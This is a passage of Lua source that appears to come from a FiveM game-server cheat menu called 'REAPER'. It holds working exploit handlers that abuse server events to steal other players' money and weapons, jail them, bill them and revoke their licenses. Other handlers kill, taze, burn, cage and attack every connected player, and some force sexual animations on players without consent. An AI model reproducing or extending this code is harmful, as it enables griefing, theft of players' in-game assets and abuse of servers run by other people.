                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.RandomizeVehLook(veh)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                fuel = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                if __REAPER1__.N.DecorExistOn(veh, "_FUEL_LEVEL") then
                                    __REAPER1__.N.DecorSetFloat(veh, "_FUEL_LEVEL", __REAPER1__.F.IntToFloat(p4 - 1))
                                end
                                __REAPER1__.N.SetVehicleFuelLevel(veh, __REAPER1__.F.IntToFloat(p4 - 1))
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                lock = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                local lock = __REAPER1__.N.GetVehicleDoorLockStatus(veh)
                                if lock == 0 or lock == 1 then
                                    __REAPER1__.N.OpDoorLock(veh, 2)
                                elseif lock == 2 then
                                    __REAPER1__.N.OpDoorLock(veh, 1)
                                end
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                open = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.SetVehicleDoorOpen(veh, p4 - 1, false, false)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                close = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.SetVehicleDoorShut(veh, p4 - 1, false)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.SetVehicleDoorBroken(veh, p4 - 1, true)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
                flip = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        __REAPER25__(function()
                            local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                            if __REAPER1__.F.NetControl(veh) then
                                __REAPER1__.N.SetEntityRotation(veh, 0, 180.0, __REAPER1__.N.GetEntityHeading(veh), 1, true)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Player not in vehicle.', 5000, 210, 210, 0)
                    end
                end,
            },
            weapon = {
                give = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    local t = string.sub(p1, 0, a2 + 1)
                    __REAPER1__.N.GiveWeaponToPed(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)), p2[p4] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4]), __REAPER1__.A[t .. '_ammo'].sindex - 1, false, false)
                end,
                giveall = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    local t = string.sub(p1, 0, a2 + 1)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    for i = 1, #__REAPER1__.T.Weapons do
                        __REAPER1__.N.GiveWeaponToPed(ped, __REAPER1__.T.Weapons[i] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. __REAPER1__.T.Weapons[i]), __REAPER1__.A[t .. '_ammo'].sindex - 1, false, true)
                    end
                end,
                spawn = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        local p = __REAPER1__.N.CreatePickup(p2[p4] == 'Parachute' and `PICKUP_PARACHUTE` or __REAPER1__.N.GetHashKey('PICKUP_WEAPON_' .. p2[p4]), __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(p6)))
                        __REAPER26__(3000)
                        __REAPER1__.N.RemovePickup(p)
                    end)
                end,
                spawnall = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    for i = 1, #__REAPER1__.T.Weapons do
                        __REAPER25__(function()
                            local p = __REAPER1__.N.CreatePickup(__REAPER1__.T.Weapons[i] == 'Parachute' and `PICKUP_PARACHUTE` or __REAPER1__.N.GetHashKey('PICKUP_WEAPON_' .. __REAPER1__.T.Weapons[i]), __REAPER1__.N.GetEntityCoords(ped))
                            __REAPER26__(3000)
                            __REAPER1__.N.RemovePickup(p)
                        end)
                    end
                end,
                remove = function(p1, p2, p3, p4, p5, p6, p7)
                    local weapon = p2[p4] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4])
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    local t = string.sub(p1, 0, a2 + 1)
    
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    __REAPER1__.N.RemoveWeaponFromPed(ped, weapon)
                    __REAPER1__.N.SetPedAmmo(ped, weapon, __REAPER1__.A[t .. '_ammo'].sindex - 1)
                end,
                removec = function(p1, p2, p3, p4, p5, p6, p7)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    local jelenlegiFegyoBool, jelenlegiFegyo = __REAPER1__.N.GetCurrentPedWeapon(ped, 1)
                    if jelenlegiFegyoBool then
                        local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                        local t = string.sub(p1, 0, a2 + 1)
                        __REAPER1__.N.RemoveWeaponFromPed(ped, jelenlegiFegyo)
                        __REAPER1__.N.SetPedAmmo(ped, weapon, __REAPER1__.A[t .. '_ammo'].sindex - 1)
                    else
                        __REAPER1__.F.AddNotification('No weapon in player\'s hands.', 5000, 210, 210, 0)
                    end
                end,
                removeall = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    local t = string.sub(p1, 0, a2 + 1)
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                    for i = 1, #__REAPER1__.T.Weapons do
                        local weapon = __REAPER1__.T.Weapons[i] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. __REAPER1__.T.Weapons[i])
                        __REAPER1__.N.RemoveWeaponFromPed(ped, weapon)
                        __REAPER1__.N.SetPedAmmo(ped, weapon, __REAPER1__.A[t .. '_ammo'].sindex - 1)
                    end
                end,
                btracer = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.TracePlayersB = {}
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('btraced', p6, string.sub(p1, 0, a2 + 1))
                end,
                itracer = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.TracePlayersI = {}
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('itraced', p6, string.sub(p1, 0, a2 + 1))
                end,
                cartoon = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('cartoon', p6, string.sub(p1, 0, a2 + 1))
                end,
                explodingbullets = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('explodingbullets', p6, string.sub(p1, 0, a2 + 1))
                end,
            },
            sound = {
                sound = function(p1, p2, p3, p4, p5, p6, p7)
                    local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)))
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    local t = string.sub(p1, 0, a2 + 1)
                    __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A[t .. '_type'].sindex].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A[t .. '_type'].sindex].dict, true, 1.0, true)
                end,
                soundl = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('sound', p6, string.sub(p1, 0, a2 + 1))
                end,
                soundr = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('soundr', p6, string.sub(p1, 0, a2 + 1))
                end,
                soundr2 = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('soundr2', p6, string.sub(p1, 0, a2 + 1))
                end,
            },
            trigger = {
                anim = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('dpemotes') == 'started' then
                        __REAPER1__.N.TriggerServerEvent('ServerValidEmote', p6, __REAPER1__.T.TriggerAnims[p4], '')
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                stealm = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSteal then
                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerSteal, p6, __REAPER1__.N.GetPlayerServerId(__REAPER1__.V.SelfPlayerId), 'item_money', '', p2)
                    else
                        __REAPER1__.V.TriggerSteal = __REAPER1__.F.DynamicTrigger('esx_inventoryhud', 'TriggerServerEvent', 'TakeFromPlayer')
                    end
                end,
                stealwep = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSteal then
                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerSteal, p6, __REAPER1__.N.GetPlayerServerId(__REAPER1__.V.SelfPlayerId), 'item_weapon', '', p2)
                    else
                        __REAPER1__.V.TriggerSteal = __REAPER1__.F.DynamicTrigger('esx_inventoryhud', 'TriggerServerEvent', 'TakeFromPlayer')
                    end
                end,
                jail = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerJail then
                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerJail, p6, p2[p4], '\n\n   ???^7^*REAPER ON TOP   \n\n')
                    else
                        __REAPER1__.V.TriggerJail = __REAPER1__.F.DynamicTrigger('esx-qalle-jail', 'TriggerServerEvent', 'GetPlayerServerId%(')
                    end
                end,
                bill = function(p1, p2, p3, p4, p5, p6, p7)
                    local bill = __REAPER1__.F.StringSplit(p2, ' ')
                    if __REAPER1__.V.TriggerBill then
                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerBill, p6, '', bill[1], tonumber(bill[2]))
                    else
                        __REAPER1__.V.TriggerBill = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', 'society_police')
                    end
                end,
                commserv = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('esx_communityservice') == 'started' then
                        __REAPER1__.N.TriggerServerEvent('esx_communityservice:sendToCommunityService', p6, tonumber(p4))
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                rcommserv = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('esx_communityservice') == 'started' then
                        __REAPER1__.N.TriggerServerEvent('esx_communityservice:endCommunityServiceCommand', p6)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                message = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerMsg then
                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerMsg, p6, p4)
                    else
                        __REAPER1__.V.TriggerMsg = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', "license_revoked")
                    end
                end,
                carry = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerCarry then
                        if p1 == 'Default' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, p6, 100000, 0.0, 49, 33, 1)
                        elseif p1 == 'Secks' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'rcmpaparazzo_2', 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', 0.0, 0.0, 0.0, p6, 100000, 0.0, 49, 33, 1)
                        elseif p1 == 'Fucked' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, p6, 100000, 0.0, 256, 256, 1)
                        end
                    else
                        __REAPER1__.V.TriggerCarry = __REAPER1__.F.DynamicTrigger('CarryPeople', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                th = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerTakeHostage then
                        if p1 == 'Default' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, p6, 100000, 0.0, 49, 49, 50, true)
                        elseif p1 == 'Secks' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'rcmpaparazzo_2', 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', 0.11, -0.24, 0.0, p6, 100000, 0.0, 49, 49, 50, true)
                        elseif p1 == 'Fucked' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, p6, 100000, 0.0, 256, 256, 256, true)
                        end
                    else
                        __REAPER1__.V.TriggerTakeHostage = __REAPER1__.F.DynamicTrigger('TakeHostage', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                piggyback = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerPiggyback then
                        if p1 == 'Default' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'anim@arena@celeb@flat@paired@no_props@', 'piggyback_c_player_a', 'piggyback_c_player_b', -0.07, 0.0, 0.45, p6, 100000, 0.0, 49, 33, 1)
                        elseif p1 == 'Secks' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', -0.07, 0.0, 0.45, p6, 100000, 0.0, 49, 33, 1)
                        elseif p1 == 'Fucked' then
                            __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'anim@arena@celeb@flat@paired@no_props@', 'piggyback_c_player_a', 'piggyback_c_player_b', -0.07, 0.0, 0.45, p6, 100000, 0.0, 256, 256, 1)
                        end
                    else
                        __REAPER1__.V.TriggerPiggyback = __REAPER1__.F.DynamicTrigger('PiggyBack', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                license = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerRemoveLic then
                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerRemoveLic, p6, p4)
                    else
                        __REAPER1__.V.TriggerRemoveLic = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', "label = %(")
                    end
                end,
                sound = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('InteractSound') == 'started' then
                        __REAPER1__.N.TriggerServerEvent('InteractSound_SV:PlayOnOne', p6, string.lower(p2[p4]), 10000.0)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                csound = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerHifi then
                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerHifi, p4, __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))))
                    else
                        __REAPER1__.V.TriggerHifi = __REAPER1__.F.DynamicTrigger('esx_hifi', 'TriggerServerEvent', "__REAPER25__%(")
                    end
                end,
            },
            particle = {
                play = function(p1, p2, p3, p4, p5, p6, p7)
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6)))
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    local t = string.sub(p1, 0, a2 + 1)
                    local rx, ry, rz = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A[t .. '_rotation'].func, ' ', true)
                    local ax, ay, az = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A[t .. '_axis'].func, ' ', true)

                    __REAPER1__.N.DoParticle(__REAPER1__.T.ParticleEffects[__REAPER1__.A[t .. '_type'].sindex].dict, __REAPER1__.T.ParticleEffects[__REAPER1__.A[t .. '_type'].sindex].name, coords.x, coords.y, coords.z, __REAPER1__.F.IntToFloat(__REAPER1__.A[t .. '_scale'].sindex), rx, ry, rz, ax, ay, az)
                end,
                lplay = function(p1, p2, p3, p4, p5, p6, p7)
                    local a1, a2 = string.find(p1, '91b72Ag=', 1, true)
                    __REAPER1__.F.LoopedPlayer('particle', p6, string.sub(p1, 0, a2 + 1))
                end
            },
            attach = {
                attach = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p7) then
                            local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(p6))
                            local obj = __REAPER1__.N.CreateObject(p7, __REAPER1__.N.GetEntityCoords(ped), true, true, false)
                            __REAPER1__.N.AttachEntityToEntity(obj, ped, 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 1, true)
                        end
                    end)
                end
            },
        },
        aplayers = {
            kill = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if p4 == 1 and (not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func) then
                                local coords = __REAPER1__.N.GetEntityCoords(ped)
                                __REAPER1__.N.ShootSilentSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 100.0, true, `WEAPON_PISTOL`, __REAPER1__.V.SelfPed, false, true, 999999999, false, false, 0)
                            elseif not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local coords = __REAPER1__.N.GetEntityCoords(ped)
                                local sped =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], coords.x, coords.y, coords.z - 50.0, 0.0, true, true)
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 100.0, true, `WEAPON_PISTOL`, sped, false, true, 999999999, false, false, 0)
                                __REAPER1__.N.DeleteEntity(sped)
                            end

                            __REAPER26__(0)
                        end
                    end
                end)
            end,
            taze = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local coords = __REAPER1__.N.GetEntityCoords(ped)
                                local sped =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], coords.x, coords.y, coords.z - 50.0, 0.0, true, true)
                                __REAPER1__.N.ShootSingleBulletBetweenCoords(coords, coords.x, coords.y, coords.z + 0.01, 0.0, true, `WEAPON_STUNGUN`, sped, false, true, 999999999, false, false, 0)
                                __REAPER1__.N.DeleteEntity(sped)
                            end

                            __REAPER26__(0)
                        end
                    end
                end)
            end,
            burn = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            for i = 1, 50 do
                                local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.N.GetPlayerPed(v), 0.0, 1.0, 0.0)
                                __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', coords.x, coords.y, coords.z, 2.0, 0, 0, 0, 0, 0, 0)
                                num = num + 1
                            end

                            __REAPER26__(500)
                        end
                    end
                end)
            end,
            cage = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        local ped = __REAPER1__.N.GetPlayerPed(v)
                        if p2 and (not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func) then
                            if __REAPER1__.F.RequestEntity(`prop_facgate_02_l`) then
                                local head = __REAPER1__.N.GetEntityHeading(ped)
                                __REAPER1__.T.Cage[v .. 'obj1'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, 0.5, -1.0), true, true, false)
                                __REAPER1__.T.Cage[v .. 'obj2'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, -1.0, -1.0), true, true, false)
                                __REAPER1__.T.Cage[v .. 'obj3'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, 0.4, -1.0, -1.0), true, true, false)
                                __REAPER1__.T.Cage[v .. 'obj4'] = __REAPER1__.N.CreateObject(`prop_facgate_02_l`, __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, -0.7, -0.5, -1.0), true, true, false)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[v .. 'obj1'], 0.0, 0.0, head, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[v .. 'obj2'], 0.0, 0.0, head + 90, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[v .. 'obj3'], 0.0, 0.0, head + 90, 1, true)
                                __REAPER1__.N.SetEntityRotation(__REAPER1__.T.Cage[v .. 'obj4'], 0.0, 0.0, head, 1, true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[v .. 'obj1'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[v .. 'obj2'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[v .. 'obj3'], true)
                                __REAPER1__.N.FreezeEntityPosition(__REAPER1__.T.Cage[v .. 'obj4'], true)
                            end
                        elseif not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[v .. 'obj1'])
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[v .. 'obj2'])
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[v .. 'obj3'])
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.Cage[v .. 'obj4'])
                            __REAPER1__.T.Cage[v .. 'obj1'], __REAPER1__.T.Cage[v .. 'obj2'], __REAPER1__.T.Cage[v .. 'obj3'], __REAPER1__.T.Cage[v .. 'obj4'] = nil, nil, nil, nil
                        end


                        __REAPER26__(10)
                    end
                end)
            end,
            demigod = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        local ped = __REAPER1__.N.GetPlayerPed(v)
                        if not p2 and (not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func) then
                            __REAPER1__.N.DeleteEntity(__REAPER1__.T.PlyDemigod[v])
                            __REAPER1__.T.PlyDemigod[v] = nil
                        elseif not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            if __REAPER1__.F.RequestEntity(`prop_juicestand`) then
                                __REAPER1__.T.PlyDemigod[v] = __REAPER1__.N.CreateObject(`prop_juicestand`, __REAPER1__.N.GetEntityCoords(ped), true, true, false)
                                __REAPER1__.N.AttachEntityToEntity(__REAPER1__.T.PlyDemigod[v], ped, __REAPER1__.N.GetPedBoneIndex(ped, 57005), 0, 0, 0, 0, 0, 0, false, false, false, true, 1, true)
                                __REAPER1__.N.SetEntityProofs(__REAPER1__.T.PlyDemigod[v], true, true, true, true, true, true, true, false)
                                __REAPER1__.N.SetEntityVisible(__REAPER1__.T.PlyDemigod[v], false)
                            end
                        end

                        __REAPER26__(10)
                    end
                end)
            end,
            alpha = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            __REAPER1__.N.SetEntityAlpha(__REAPER1__.N.GetPlayerPed(v), p2[p4], false)
                        end
                    end
                end)
            end,
            clone = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            __REAPER1__.N.ClonePed(ped, __REAPER1__.N.GetEntityHeading(ped), true, true)
                        end

                        __REAPER26__(5)
                    end
                end)
            end,
            attackc = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            for i = 1, math.random(2, 5) do
                                local clone = __REAPER1__.N.ClonePed(ped, __REAPER1__.N.GetEntityHeading(ped), true, true)
                                __REAPER1__.N.GiveWeaponToPed(clone, `WEAPON_KNIFE` , 9999, false, true)
                                __REAPER1__.N.TaskCombatPed(clone, ped, 0, 16)
                            end
                        end

                        __REAPER26__(10)
                    end
                end)
            end,
            attacks = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if __REAPER1__.F.RequestEntity(`s_m_y_swat_01`) then
                                for i = 1, math.random(2, 5) do
